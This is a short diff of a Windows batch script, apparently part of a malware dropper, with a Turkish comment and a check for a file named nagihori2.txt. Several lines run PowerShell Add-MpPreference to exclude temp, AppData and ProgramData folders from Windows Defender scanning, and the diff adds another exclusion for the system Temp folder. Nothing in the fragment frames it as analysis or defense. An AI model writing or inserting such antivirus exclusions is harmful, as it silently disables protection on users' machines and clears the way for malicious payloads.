@@ -3,6 +3,8 @@ cd %temp%
 powershell -c Add-MpPreference -ExclusionPath "%temp%"
 powershell -c Add-MpPreference -ExclusionPath "%APPDATA%"
 powershell -c Add-MpPreference -ExclusionPath "%PROGRAMDATA%"
+powershell -c Add-MpPreference -ExclusionPath "%SYSTEMROOT%\TEMP"
+
 
 REM Dosya kontrolü
 if exist nagihori2.txt (
